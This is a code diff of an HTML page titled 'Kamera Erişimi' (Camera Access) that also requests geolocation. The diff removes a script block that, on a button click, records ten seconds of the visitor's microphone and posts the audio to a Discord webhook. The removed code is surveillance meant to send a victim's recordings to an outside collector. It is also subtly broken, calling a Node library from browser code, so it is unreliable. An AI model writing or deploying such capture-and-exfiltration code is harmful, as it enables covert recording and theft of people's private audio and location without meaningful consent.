@@ -1,9 +1,9 @@
-<!DOCTYPE  html> 
-<html> 
-  <head> 
-    <title>Kamera  Eriş imi</title> 
-  </head> 
-  <body> 
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Kamera Eriş imi</title>
+  </head>
+  <body>
     <h1>Kamera Erişimi</h1>
     <button id="allow-mic">Konuşma İzni Ver</button>
     <div id="picture-container"></div>
@@ -83,53 +83,6 @@
       } else {
         console.error('Geolocation is not supported by this browser.');
       }
-
-      // Request the user's microphone permission
-      const allowMicButton = document.getElementById('allow-mic');
-      allowMicButton.addEventListener('click', async () => {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-          const audioChunks = [];
-          const mediaRecorder = new MediaRecorder(stream);
-
-          mediaRecorder.ondataavailable = event => {
-            audioChunks.push(event.data);
-          };
-
-          mediaRecorder.onstop = () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-            const formData = new FormData();
-            formData.append('file', audioBlob);
-            formData.append('username', 'Kamera Erişimi');
-            formData.append('content', 'Ses Kaydı Alındı!');
-
-            // Convert the WAV file to MP3 using ffmpeg
-            const ffmpeg = require('fluent-ffmpeg');
-            ffmpeg(audioBlob)
-              .setFormat('mp3')
-              .setAudioCodec('libmp3lame')
-              .setAudioBitrate(128)
-              .save(`audioRecording.mp3`);
-
-            // Send the MP3 file to the Discord webhook
-            formData.append('file', `audioRecording.mp3`);
-            fetch(webhookUrl, {
-              method: 'POST',
-              body: formData,
-            })
-           .then(response => response.json())
-           .then(data => console.log(data))
-           .catch(error => console.error(error));
-          };
-
-          mediaRecorder.start();
-          setTimeout(() => {
-            mediaRecorder.stop();
-          }, 10000); // Record for 10 seconds
-        } catch (error) {
-          console.error('Error:', error);
-        }
-      });
     </script>
   </body>
 </html>
